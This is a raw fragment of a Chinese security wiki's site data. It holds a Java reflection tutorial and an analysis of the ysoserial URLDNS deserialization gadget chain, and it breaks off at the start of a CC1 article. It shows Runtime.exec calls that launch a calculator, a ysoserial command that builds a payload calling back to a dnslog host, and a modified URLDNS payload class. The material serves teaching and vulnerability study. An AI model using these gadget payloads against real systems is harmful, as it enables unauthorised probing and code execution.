反射\n\n要想知道什么是反射，首先需要明白什么是“正”。在正常情况下，我们创建对象的方式，就像下面这个例子，我们想要创建student类的对象，并调用其中的sayhello方法：\n\nstudent student = new student();\nstudent.sayhello();\n\n\n1\n2\n\n\n如同上面代码那样，因为我们事先已经知道了我要要创建哪个类的对象，因此我使用关键字new去创建想要的对象。可以将这种方法理解为“正”。那么，如果我们不知道我们要创建哪个类的对象呢？你可能想到使用变量来代替上面new后面的类名，但是在java中，这是不行的。\n\nstring classname = "student";\nstudent student = new classname();\n\n\n1\n2\n\n\n因此，在jdk中提供了一种反射的机制，通过这种机制可以动态的创建出未知类的对象。\n\nclass<?> clazz = class.forname("com.pwddd.reflaction.student");\nconstructor<?> constructor = clazz.getconstructor();\nstudent s = (student) constructor.newinstance();\ns.sayhello();\n\n\n1\n2\n3\n4\n\n\n使用这种方式创建对象并调用方法和使用new的方式创建对象在执行结果上没有什么区别，不同的是我们在执行这段代码之前，可以不知道创建的是哪个类的对象。\n\n所以，什么是反射？\n\n反射，就是在运行程序前并不知道要创建哪个类的对象，但是可以在运行时动态的获取类的完整结构，并调用其中的方法。\n\n\n# 获取类对象的三种方法\n\n 1. class.forname方式\n    \n    class<?> clazz = class.forname("com.pwddd.reflaction.student");\n    \n    \n    1\n    \n\n 2. xxx.class方式\n    \n    class<student> stuclazz = student.class;\n    \n    \n    1\n    \n\n 3. xxx.getclass方式\n    \n    class<? extends student> clazz = student.getclass();\n    \n    \n    1\n    \n\n对于第一种方式，forname方法还有一个重载的方法如下：\n\npublic static class<?> forname(string name, boolean initialize,classloader loader)\n\n\n1\n\n\n该方法有三个参数，第一个参数为反射生成class类对象的全类名，第二个参数为是否进行初始化，第三个参数是类加载器。对于第二个参数，如果设置为true，则会进行类的初始化，但是并不会调用构造函数。\n\n如果我们知道存在一个类的全类名，在这个类的初始化块中存在恶意的代码，那么我们就可以利用反射去执行这段代码。（在正常的开发中，一般没有这种类）\n\npackage com.pwddd.reflaction;\n\nimport java.io.ioexception;\n\npublic class myerrorclass {\n  static {\n    try {\n      system.out.println("static");\n      runtime.getruntime().exec("/system/applications/calculator.app/contents/macos/calculator");\n    } catch (ioexception e) {\n      e.printstacktrace();\n    }\n  }\n\n  {\n    try {\n      system.out.println("common block");\n      runtime.getruntime().exec("/system/applications/calculator.app/contents/macos/calculator");\n    } catch (ioexception e) {\n      e.printstacktrace();\n    }\n  }\n\n  public myerrorclass() {\n    system.out.println("consructor....");\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n使用反射创建对象。\n\nclass<?> clazz = class.forname("com.pwddd.reflaction.myerrorclass",true, testreflaction.class.getclassloader());\n\n\n1\n\n\n我们会发现，系统弹出了计算器，并且在控制台打印了static。这也印证了前面的说法，当第二个参数为true时，会进行类的初始化，执行静态代码块中的内容。而非静态代码块中的内容在创建对象的时候会执行。当我们使用forname的另一个重载方法进行反射时，发现同样也执行了static代码块的内容，这是因为forname单参数方法和三个参数的forname方法最终都会调用forname0方法，initialize参数都为true，并将初始化参数设置为true。\n\nreturn forname0(classname, true, classloader.getclassloader(caller), caller);\n\n\n1\n\n\n\n# 获取类的对象的方式\n\n 1. 使用类对象的newinstance方法。\n    \n    class<?> clazz = class.forname("com.pwddd.reflaction.student");\n    student student = (student) clazz.newinstance();\n    \n    \n    1\n    2\n    \n\n 2. 获取构造器，调用构造器获取对象。\n    \n    class<?> clazz = class.forname("com.pwddd.reflaction.student");\n    constructor<?> constructor = clazz.getconstructor();\n    student student = (student) constructor.newinstance();\n    \n    \n    1\n    2\n    3\n    \n\n第一种方式获取对象，实际上是调用了类的无参构造方法，如果没有无参构造方法（或无参构造方法非public），则会报错。\n\n\n\n那么对于有些类（例如：runtime类），我们怎么获取其对象呢？\n\nclass<?> clazz = class.forname("java.lang.runtime");\nruntime runtime = (runtime) clazz.newinstance();\nsystem.out.println(runtime);\n\n\n1\n2\n3\n\n\n我们发现，直接使用newinstance方法无法创建对象。查看runtime源码发现，该类的构造方法设置为了private。\n\n\n\n这实际上是单例设计模式的常见写法，所谓单例设计模式，简单理解就是无法使用new的方式创建对象，提供一个静态的方法获取对象，以保证对象的唯一性。如runtime对象所示：\n\n\n\n那么我们要怎样才能获取到这种类的对象呢？我们需要先获取到这个类的指定的方法，通常为get类名方法，该方法的返回值是这个类的对象。\n\n\n# 获取类中的方法\n\n在获取到类对象后，可以调用类对象的getmethod方法获取到指定的方法，或者创建该类的对象，使用对象调用方法。\n\n// 获取method方法对象，调用invoke执行方法\nclass<?> clazz = class.forname("com.pwddd.reflaction.student");\nmethod sayhello = clazz.getmethod("sayhello");\nsayhello.invoke(clazz.newinstance());\n\n// 创建指定类的实例，调用方法\nstudent student = (student) clazz.newinstance();\nstudent.sayhello();\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n其中，在调用invoke时，第一个参数为调用指定方法的类的对象，可变参数为方法的参数。\n\n对于类中的非public方法，可以使用getdeclaredmethod获取到指定的方法。还需要设置可访问为true，否则会报错无法访问。\n\nclass<?> clazz = class.forname("com.pwddd.reflaction.student");\nmethod privatesayhello = clazz.getdeclaredmethod("privatesayhello", string.class);\nprivatesayhello.setaccessible(true);\nprivatesayhello.invoke(clazz.newinstance(),"zhangsan");\n\n\n1\n2\n3\n4\n\n\n在上一节中，我们发现当构造器不存在或者为非public时，无法通过``newinstance`创建对象，那么在知道如何获取类中的方法并且执行后，获取对象就没有什么难度了。\n\n以runtime方法为例，我们可以获取私有的构造器，然后创建对象。\n\nclass<?> clazz = class.forname("java.lang.runtime");\nconstructor<?> declaredconstructor = clazz.getdeclaredconstructor();\ndeclaredconstructor.setaccessible(true);\nruntime runtime = (runtime) declaredconstructor.newinstance();\nruntime.exec("/system/applications/calculator.app/contents/macos/calculator");\n\n\n1\n2\n3\n4\n5\n\n\n我们也可以获取到runtime类中的getruntime方法，执行该方法返回一个runtime实例。\n\nclass<?> clazz = class.forname("java.lang.runtime");\nmethod getruntime = clazz.getmethod("getruntime");\nruntime runtime = (runtime) getruntime.invoke(clazz);\nruntime.exec("/system/applications/calculator.app/contents/macos/calculator");\n\n\n1\n2\n3\n4\n\n\n那么执行命令的反射写法就可以简化为下面的方式了：\n\nclass<?> clazz = class.forname("java.lang.runtime");\nclazz.getmethod("exec", string.class)\n  .invoke(clazz.getmethod("getruntime")\n       .invoke(clazz),"/system/applications/calculator.app/contents/macos/calculator");\n\n\n1\n2\n3\n4\n\n\n\n# 获取类中的属性\n\n获取类中的属性和获取方法的方式类似，使用getfield方法。\n\nclass<?> clazz = class.forname("com.pwddd.reflaction.student");\nfield username = clazz.getdeclaredfield("username");\nusername.setaccessible(true);\nstudent student = (student) clazz.newinstance();\nusername.set(student,"zhangsan");\nsystem.out.println(student.getusername());\n\n\n1\n2\n3\n4\n5\n6\n\n\n以上就是java中反射的基础内容了，有了以上的知识便于我们理解java反序列化漏洞的原理。',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"URLDNS链分析",frontmatter:{title:"URLDNS链分析",date:"2022-03-12T12:00:00.000Z",permalink:"/sec/vuln/deserialization/urldns",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"原创",categories:["漏洞原理","反序列化漏洞"],tags:["反序列化","URLDNS","ysoserial"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/201.%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/2010.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/01.URLDNS%E5%88%86%E6%9E%90.html",relativePath:"02.安全/201.漏洞原理/2010.反序列化漏洞/01.URLDNS分析.md",key:"v-376db697",path:"/sec/vuln/deserialization/urldns/",headers:[{level:2,title:"利用复现",slug:"利用复现",normalizedTitle:"利用复现",charIndex:148},{level:2,title:"利用链分析",slug:"利用链分析",normalizedTitle:"利用链分析",charIndex:674},{level:3,title:"生成序列化文件",slug:"生成序列化文件",normalizedTitle:"生成序列化文件",charIndex:684}],headersStr:"利用复现 利用链分析 生成序列化文件",content:'# ysoserial - URLDNS链分析\n\nysoserial是一个非常好用的java反序列化的辅助工具，其中提供了大量了反序列化利用链，可以帮助我们生成对应的payload。\n\nysoserial下载地址：https://github.com/frohoff/ysoserial\n\n\n# 利用复现\n\n首先使用ysoserial生成URLDNS对应的反序列化数据。\n\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://t7xvva.dnslog.cn" > urldns.ser\n\n\n1\n\n\n然后模拟将生成的序列化文件反序列化读取。\n\npublic static void main(String[] args) throws IOException, ClassNotFoundException {\n  FileInputStream fis = new FileInputStream("urldns.ser");\n  ObjectInputStream ois = new ObjectInputStream(fis);\n  Object object = ois.readObject();\n  System.out.println(object);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n执行代码之后，就会发现我们的dnslog上会有一次dns的请求。该请求就是因为反序列化了URLDNS生成的序列化文件导致的。\n\n\n\n接下来我们分析一下请求DNS的原因。\n\n\n# 利用链分析\n\n\n# 生成序列化文件\n\n首先，先来看一下我们生成URLDNS payload的命令。\n\njava -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS "http://t7xvva.dnslog.cn" > urldns.ser\n\n\n1\n\n\n共指定了两个参数，URLDNS是对应利用链的名称，后面的dnslog地址是对应的参数。我们看ysoserial是怎么帮我们生成序列化文件的。\n\n当使用java -jar运行ysoserial时，实际上运行的是GeneratePayload类的main方法，该方法调用了Utils.getPayloadClass利用反射创建了我们传入的URLDNS对应的类的对象。然后调用getObject方法获取到利用链需要被反序列化的对象。之后将对象反序列化之后输出。\n\nfinal Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);\nif (payloadClass == null) {\n  System.err.println("Invalid payload type \'" + payloadType + "\'");\n  printUsage();\n  System.exit(USAGE_CODE);\n  return; // make null analysis happy\n}\n\ntry {\n  final ObjectPayload payload = payloadClass.newInstance();\n  final Object object = payload.getObject(command);\n  PrintStream out = System.out;\n  Serializer.serialize(object, out);\n  ObjectPayload.Utils.releasePayload(payload, object);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n在Utils.getPayloadClass方法中，利用反射创建我们传入的类的类对象。如果传入的是完整的类名，则直接创建类对象。如果传入的不是完整类名，则去payloads包中寻找，我们传入的URLDNS不是完整的类名，因此对应ysoserial.payloads.URLDNS类。\n\npublic static Class<? extends ObjectPayload> getPayloadClass ( final String className ) {\n  Class<? extends ObjectPayload> clazz = null;\n  try {\n    clazz = (Class<? extends ObjectPayload>) Class.forName(className);\n  }\n  catch ( Exception e1 ) {}\n  if ( clazz == null ) {\n    try {\n      return clazz = (Class<? extends ObjectPayload>) Class\n        .forName(GeneratePayload.class.getPackage().getName() + ".payloads." + className);\n    }\n    catch ( Exception e2 ) {}\n  }\n  if ( clazz != null && !ObjectPayload.class.isAssignableFrom(clazz) ) {\n    clazz = null;\n  }\n  return clazz;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n我们重点来看URLDNS类的getObject方法。这个方法十分的简单，是ysoserial中最简单的利用链了。\n\npublic Object getObject(final String url) throws Exception {\n\n  URLStreamHandler handler = new SilentURLStreamHandler();\n\n  HashMap ht = new HashMap(); \n  URL u = new URL(null, url, handler); \n  ht.put(u, url); \n\n  Reflections.setFieldValue(u, "hashCode", -1); \n  return ht;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nURLDNS的gadget chains为：\n\n *   Gadget Chain:\n *     HashMap.readObject()\n *       HashMap.putVal()\n *         HashMap.hash()\n *           URL.hashCode()\n\n\n1\n2\n3\n4\n5\n\n\n我们一步一步来看，首先我们生成序列化文件的类是一个HashMap，因此在反序列化的过程中，会调用HashMap的readObject方法。而在该方法中，有一个putVal的操作。\n\n\n\n在putVal方法的参数上，计算了hashMap对应的key的hash值。在计算hash的时候，调用的是对应key的hashCode方法。\n\n\n\n那么如果我们hashMap中的key是一个URL对象，那么调用的就是URL的hashCode方法了。在URL的hashCode方法中有一点非常重要，就是hashCode!=-1，意思是在这之前没有调用过该对象的计算hash的方法。这也是ysoserial中将URL对象的hashCode设置为-1的原因。如果hashCode等于-1，那么就会调用handler.hashCode方法，并且给这个hashCode方法传入当前的URL对象。\n\n\n\n那么，这个handler是什么呢？我们看URL的构造方法可以发现，handler是我们通过构造函数创建对象时传入的。\n\n\n\n传入的对象是URLStreamHandler的子类，ysoserial中创建了一个类，继承了该类。为什么这么做我们后面再说。\n\nstatic class SilentURLStreamHandler extends URLStreamHandler {\n\n  protected URLConnection openConnection(URL u) throws IOException {\n    return null;\n  }\n\n  protected synchronized InetAddress getHostAddress(URL u) {\n    return null;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n那么为什么要创建这个类呢？我们上面说到，会调用我们传入的对象的hashCode方法。我们可以看URLStreamHandler的hashCode方法。重点就在getHostAddress方法中。在该方法中调用了InetAddress.getByName(host)，发起了DNS请求，而传入的host的值是通过URL对象的getHost获取的，getHost方法返回了成员变量host的值，这个值也是在创建URL实例时传入构造器的。\n\n\n\n因此再来回顾ysoserial中的URLDNS中getObject方法。\n\npublic Object getObject(final String url) throws Exception {\n\n  URLStreamHandler handler = new SilentURLStreamHandler();\n\n  HashMap ht = new HashMap(); \n  URL u = new URL(null, url, handler); \n  ht.put(u, url); \n\n  Reflections.setFieldValue(u, "hashCode", -1); \n  return ht;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n该方法实际上返回了一个hashMap对象，也就是最终序列化的是一个hashMap对象。该对象中有一个以URL对象为key的键值对。因此在反序列化的过程中，先调用了hashMap的readObject方法，然后在该方法中需要计算key的hashCode，于是又调用了URL的hashCode方法。而当hashCode等于-1时，URL中的hashCode方法调用的是handler.hashCode方法，handler是我们传入的对象。这也解释了为什么ysoserial中会将URL对象的hashCode设置为-1。在handler.hashCode方法中传入了URL对象，并根据URL对象的host属性，发起了DNS请求。这就是一次完整的URLDNS利用过程。\n\n当我们仔细看ysoserial的代码时，我们发现，在往hashMap中put键值对的时候，也会调用计算key的hash，那么应该也会请求DNS。\n\n\n\n我们可以简单写一段代码实验一下。\n\npublic static void main(String[] args) throws MalformedURLException {\n  HashMap hashMap = new HashMap();\n  URL url = new URL("http://abc.0dlg1h.dnslog.cn");\n  hashMap.put(url,"test");\n}\n\n\n1\n2\n3\n4\n5\n\n\n经过测试，发现在put操作的时候确实会发起DNS请求。\n\n\n\n实际上，经过上面的分析我们知道，只要URL对象的hashCode不等于-1，就不会调用handler的hashCode方法，也就不会发起请求了。因此我们尝试将URL对象的hashCode值改为非-1。\n\nURL url = new URL("http://abc.0dlg1h.dnslog.cn");\nClass<?> clazz = Class.forName("java.net.URL");\nField hashCode = clazz.getDeclaredField("hashCode");\nhashCode.setAccessible(true);\nhashCode.set(url,123);\nhashMap.put(url,"test2");\n\n\n1\n2\n3\n4\n5\n6\n\n\n经过测试，不会再去请求dns了。那么为什么ysoserial中也没有将hashCode修改为非-1的值，也不会发起多次请求呢？还记得上面我们提到，ysoserial创建一个新类继承URLStreamHandler作为handler对象。\n\n那么为什么ysoserial不直接使用URLStreamHandler的对象作为URL中的handler，还要多此一举创建一个新的类继承URLStreamHandler呢？我们仔细看ysoserial中的重写的方法。\n\nstatic class SilentURLStreamHandler extends URLStreamHandler {\n\n  protected URLConnection openConnection(URL u) throws IOException {\n    return null;\n  }\n\n  protected synchronized InetAddress getHostAddress(URL u) {\n    return null;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n重写了getHostAddress方法，因此在handler中调用的getHostAddress方法，实际上是子类的。就不会发起请求了。\n\n那么为什么在反序列化的时候能够发起请求呢？我们看URL类中是怎么声明URLStreamHandler成员变量的。\n\n\n\n可以看出，URL中的handler是transient修饰的，也就是说，在进行序列化的时候，不会将该属性序列化。那么在反序列化的时候，实际上不是反序列化的我们重写的handler。因此就可以发起请求了。真是妙蛙种子吃着妙脆角进了米奇妙妙屋妙到家了。\n\n实际上这样就理解起来会有点麻烦，我们可以做一个小小的改进。使用修改hashCode的方式去阻止第一次的请求。\n\npackage ysoserial.payloads;\n\nimport ysoserial.payloads.annotation.Authors;\nimport ysoserial.payloads.annotation.Dependencies;\nimport ysoserial.payloads.annotation.PayloadTest;\nimport ysoserial.payloads.util.PayloadRunner;\nimport ysoserial.payloads.util.Reflections;\n\nimport java.io.IOException;\nimport java.lang.reflect.Field;\nimport java.net.InetAddress;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.net.URLStreamHandler;\nimport java.util.HashMap;\n\n\n/**\n * 这是一个自定义的URLDNS，只是做了简单的修改：\n * 去除了自定义URLStreamHandler的方式\n * 修改为利用反射修改hashCode以屏蔽第一次put时的dns请求。\n */\n@SuppressWarnings({ "rawtypes", "unchecked" })\n@PayloadTest(skip = "true")\n@Dependencies()\n@Authors({ Authors.GEBL })\npublic class MyURLDNS implements ObjectPayload<Object> {\n\n  public Object getObject(final String url) throws Exception {\n    HashMap ht = new HashMap(); // 创建一个hashMap\n    URL u = new URL(url);\n    // 利用反射修改URL对象的hashCode\n    Reflections.setFieldValue(u,"hashCode",123456);\n    ht.put(u, url);\n    Reflections.setFieldValue(u, "hashCode", -1);\n    return ht;\n  }\n\n  public static void main(final String[] args) throws Exception {\n    PayloadRunner.run(MyURLDNS.class, args);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n到此，ysoserial中最简单的URLDNS就分析完成啦。实际上该链通常作为反序列化漏洞探测的常规手段。',normalizedContent:'# ysoserial - urldns链分析\n\nysoserial是一个非常好用的java反序列化的辅助工具，其中提供了大量了反序列化利用链，可以帮助我们生成对应的payload。\n\nysoserial下载地址：https://github.com/frohoff/ysoserial\n\n\n# 利用复现\n\n首先使用ysoserial生成urldns对应的反序列化数据。\n\njava -jar ysoserial-0.0.6-snapshot-all.jar urldns "http://t7xvva.dnslog.cn" > urldns.ser\n\n\n1\n\n\n然后模拟将生成的序列化文件反序列化读取。\n\npublic static void main(string[] args) throws ioexception, classnotfoundexception {\n  fileinputstream fis = new fileinputstream("urldns.ser");\n  objectinputstream ois = new objectinputstream(fis);\n  object object = ois.readobject();\n  system.out.println(object);\n}\n\n\n1\n2\n3\n4\n5\n6\n\n\n执行代码之后，就会发现我们的dnslog上会有一次dns的请求。该请求就是因为反序列化了urldns生成的序列化文件导致的。\n\n\n\n接下来我们分析一下请求dns的原因。\n\n\n# 利用链分析\n\n\n# 生成序列化文件\n\n首先，先来看一下我们生成urldns payload的命令。\n\njava -jar ysoserial-0.0.6-snapshot-all.jar urldns "http://t7xvva.dnslog.cn" > urldns.ser\n\n\n1\n\n\n共指定了两个参数，urldns是对应利用链的名称，后面的dnslog地址是对应的参数。我们看ysoserial是怎么帮我们生成序列化文件的。\n\n当使用java -jar运行ysoserial时，实际上运行的是generatepayload类的main方法，该方法调用了utils.getpayloadclass利用反射创建了我们传入的urldns对应的类的对象。然后调用getobject方法获取到利用链需要被反序列化的对象。之后将对象反序列化之后输出。\n\nfinal class<? extends objectpayload> payloadclass = utils.getpayloadclass(payloadtype);\nif (payloadclass == null) {\n  system.err.println("invalid payload type \'" + payloadtype + "\'");\n  printusage();\n  system.exit(usage_code);\n  return; // make null analysis happy\n}\n\ntry {\n  final objectpayload payload = payloadclass.newinstance();\n  final object object = payload.getobject(command);\n  printstream out = system.out;\n  serializer.serialize(object, out);\n  objectpayload.utils.releasepayload(payload, object);\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n在utils.getpayloadclass方法中，利用反射创建我们传入的类的类对象。如果传入的是完整的类名，则直接创建类对象。如果传入的不是完整类名，则去payloads包中寻找，我们传入的urldns不是完整的类名，因此对应ysoserial.payloads.urldns类。\n\npublic static class<? extends objectpayload> getpayloadclass ( final string classname ) {\n  class<? extends objectpayload> clazz = null;\n  try {\n    clazz = (class<? extends objectpayload>) class.forname(classname);\n  }\n  catch ( exception e1 ) {}\n  if ( clazz == null ) {\n    try {\n      return clazz = (class<? extends objectpayload>) class\n        .forname(generatepayload.class.getpackage().getname() + ".payloads." + classname);\n    }\n    catch ( exception e2 ) {}\n  }\n  if ( clazz != null && !objectpayload.class.isassignablefrom(clazz) ) {\n    clazz = null;\n  }\n  return clazz;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n我们重点来看urldns类的getobject方法。这个方法十分的简单，是ysoserial中最简单的利用链了。\n\npublic object getobject(final string url) throws exception {\n\n  urlstreamhandler handler = new silenturlstreamhandler();\n\n  hashmap ht = new hashmap(); \n  url u = new url(null, url, handler); \n  ht.put(u, url); \n\n  reflections.setfieldvalue(u, "hashcode", -1); \n  return ht;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nurldns的gadget chains为：\n\n *   gadget chain:\n *     hashmap.readobject()\n *       hashmap.putval()\n *         hashmap.hash()\n *           url.hashcode()\n\n\n1\n2\n3\n4\n5\n\n\n我们一步一步来看，首先我们生成序列化文件的类是一个hashmap，因此在反序列化的过程中，会调用hashmap的readobject方法。而在该方法中，有一个putval的操作。\n\n\n\n在putval方法的参数上，计算了hashmap对应的key的hash值。在计算hash的时候，调用的是对应key的hashcode方法。\n\n\n\n那么如果我们hashmap中的key是一个url对象，那么调用的就是url的hashcode方法了。在url的hashcode方法中有一点非常重要，就是hashcode!=-1，意思是在这之前没有调用过该对象的计算hash的方法。这也是ysoserial中将url对象的hashcode设置为-1的原因。如果hashcode等于-1，那么就会调用handler.hashcode方法，并且给这个hashcode方法传入当前的url对象。\n\n\n\n那么，这个handler是什么呢？我们看url的构造方法可以发现，handler是我们通过构造函数创建对象时传入的。\n\n\n\n传入的对象是urlstreamhandler的子类，ysoserial中创建了一个类，继承了该类。为什么这么做我们后面再说。\n\nstatic class silenturlstreamhandler extends urlstreamhandler {\n\n  protected urlconnection openconnection(url u) throws ioexception {\n    return null;\n  }\n\n  protected synchronized inetaddress gethostaddress(url u) {\n    return null;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n那么为什么要创建这个类呢？我们上面说到，会调用我们传入的对象的hashcode方法。我们可以看urlstreamhandler的hashcode方法。重点就在gethostaddress方法中。在该方法中调用了inetaddress.getbyname(host)，发起了dns请求，而传入的host的值是通过url对象的gethost获取的，gethost方法返回了成员变量host的值，这个值也是在创建url实例时传入构造器的。\n\n\n\n因此再来回顾ysoserial中的urldns中getobject方法。\n\npublic object getobject(final string url) throws exception {\n\n  urlstreamhandler handler = new silenturlstreamhandler();\n\n  hashmap ht = new hashmap(); \n  url u = new url(null, url, handler); \n  ht.put(u, url); \n\n  reflections.setfieldvalue(u, "hashcode", -1); \n  return ht;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n该方法实际上返回了一个hashmap对象，也就是最终序列化的是一个hashmap对象。该对象中有一个以url对象为key的键值对。因此在反序列化的过程中，先调用了hashmap的readobject方法，然后在该方法中需要计算key的hashcode，于是又调用了url的hashcode方法。而当hashcode等于-1时，url中的hashcode方法调用的是handler.hashcode方法，handler是我们传入的对象。这也解释了为什么ysoserial中会将url对象的hashcode设置为-1。在handler.hashcode方法中传入了url对象，并根据url对象的host属性，发起了dns请求。这就是一次完整的urldns利用过程。\n\n当我们仔细看ysoserial的代码时，我们发现，在往hashmap中put键值对的时候，也会调用计算key的hash，那么应该也会请求dns。\n\n\n\n我们可以简单写一段代码实验一下。\n\npublic static void main(string[] args) throws malformedurlexception {\n  hashmap hashmap = new hashmap();\n  url url = new url("http://abc.0dlg1h.dnslog.cn");\n  hashmap.put(url,"test");\n}\n\n\n1\n2\n3\n4\n5\n\n\n经过测试，发现在put操作的时候确实会发起dns请求。\n\n\n\n实际上，经过上面的分析我们知道，只要url对象的hashcode不等于-1，就不会调用handler的hashcode方法，也就不会发起请求了。因此我们尝试将url对象的hashcode值改为非-1。\n\nurl url = new url("http://abc.0dlg1h.dnslog.cn");\nclass<?> clazz = class.forname("java.net.url");\nfield hashcode = clazz.getdeclaredfield("hashcode");\nhashcode.setaccessible(true);\nhashcode.set(url,123);\nhashmap.put(url,"test2");\n\n\n1\n2\n3\n4\n5\n6\n\n\n经过测试，不会再去请求dns了。那么为什么ysoserial中也没有将hashcode修改为非-1的值，也不会发起多次请求呢？还记得上面我们提到，ysoserial创建一个新类继承urlstreamhandler作为handler对象。\n\n那么为什么ysoserial不直接使用urlstreamhandler的对象作为url中的handler，还要多此一举创建一个新的类继承urlstreamhandler呢？我们仔细看ysoserial中的重写的方法。\n\nstatic class silenturlstreamhandler extends urlstreamhandler {\n\n  protected urlconnection openconnection(url u) throws ioexception {\n    return null;\n  }\n\n  protected synchronized inetaddress gethostaddress(url u) {\n    return null;\n  }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n重写了gethostaddress方法，因此在handler中调用的gethostaddress方法，实际上是子类的。就不会发起请求了。\n\n那么为什么在反序列化的时候能够发起请求呢？我们看url类中是怎么声明urlstreamhandler成员变量的。\n\n\n\n可以看出，url中的handler是transient修饰的，也就是说，在进行序列化的时候，不会将该属性序列化。那么在反序列化的时候，实际上不是反序列化的我们重写的handler。因此就可以发起请求了。真是妙蛙种子吃着妙脆角进了米奇妙妙屋妙到家了。\n\n实际上这样就理解起来会有点麻烦，我们可以做一个小小的改进。使用修改hashcode的方式去阻止第一次的请求。\n\npackage ysoserial.payloads;\n\nimport ysoserial.payloads.annotation.authors;\nimport ysoserial.payloads.annotation.dependencies;\nimport ysoserial.payloads.annotation.payloadtest;\nimport ysoserial.payloads.util.payloadrunner;\nimport ysoserial.payloads.util.reflections;\n\nimport java.io.ioexception;\nimport java.lang.reflect.field;\nimport java.net.inetaddress;\nimport java.net.url;\nimport java.net.urlconnection;\nimport java.net.urlstreamhandler;\nimport java.util.hashmap;\n\n\n/**\n * 这是一个自定义的urldns，只是做了简单的修改：\n * 去除了自定义urlstreamhandler的方式\n * 修改为利用反射修改hashcode以屏蔽第一次put时的dns请求。\n */\n@suppresswarnings({ "rawtypes", "unchecked" })\n@payloadtest(skip = "true")\n@dependencies()\n@authors({ authors.gebl })\npublic class myurldns implements objectpayload<object> {\n\n  public object getobject(final string url) throws exception {\n    hashmap ht = new hashmap(); // 创建一个hashmap\n    url u = new url(url);\n    // 利用反射修改url对象的hashcode\n    reflections.setfieldvalue(u,"hashcode",123456);\n    ht.put(u, url);\n    reflections.setfieldvalue(u, "hashcode", -1);\n    return ht;\n  }\n\n  public static void main(final string[] args) throws exception {\n    payloadrunner.run(myurldns.class, args);\n  }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n到此，ysoserial中最简单的urldns就分析完成啦。实际上该链通常作为反序列化漏洞探测的常规手段。',charsets:{cjk:!0},lastUpdated:"2022/04/03, 12:13:15",lastUpdatedTimestamp:1648987995e3},{title:"CC1分析",frontmatter:{title:"CC1分析",date:"2022-03-13T00:00:00.000Z",permalink:"/sec/vuln/deserialization/cc1",author:{name:"p0jo",link:"https://wiki.pwddd.com"},titleTag:"原创",categories:["漏洞原理","反序列化漏洞"],tags:["反序列化","CC","ysoserial"],readingShow:"top"},regularPath:"/02.%E5%AE%89%E5%85%A8/201.%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/2010.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/02.CC1%E5%88%86%E6%9E%90.html",relativePath:"02.安全/201.漏洞原理/2010.反序列化漏洞/02.CC1分析.md",key:"v-2a89f0a5",path:"/sec/vuln/deserialization/cc1/",headers:[{level:2,title:"背景",slug:"背景",normalizedTitle:"背景",charIndex:73},{level:2,title:"复现环境",slug:"复现环境",normalizedTitle:"复现环境",charIndex:403},{level:2,title:"分析",slug:"分析",normalizedTitle:"分析",charIndex:8},{level:3,title:"Java执行命令",slug:"java执行命令",normalizedTitle:"java执行命令",charIndex:1065},{level:3,title:"使用InvokerTRansformer执行命令",slug:"使用invokertransformer执行命令",normalizedTitle:"使用invokertransformer执行命令",charIndex:1844},{level:3,title:"解决Runtime不可序列化的问题",slug:"解决runtime不可序列化的问题",normalizedTitle:"解决runtime不可序列化的问题",charIndex:2743},{level:3,title:"包装chainedTransformer",slug:"包装chainedtransformer",normalizedTitle:"包装chainedtransformer",charIndex:3579},{level:3,title:"向上寻找",slug:"向上寻找",normalizedTitle:"向上寻找",charIndex:4413},{level:2,title:"基于TransformedMap的CC1",slug:"基于transformedmap的cc1",normalizedTitle:"基于transformedmap的cc1",charIndex:12382},{level:2,title:"Java代理",slug:"java代理",normalizedTitle:"java代理",charIndex:15285},{level:3,title:"静态代理",slug:"静态代理",normalizedTitle:"静态代理",charIndex:15414},{level:3,title:"动态代理",slug:"动态代理",normalizedTitle:"动态代理",charIndex:15422},{level:2,title:"Ysoserial的CC1",slug:"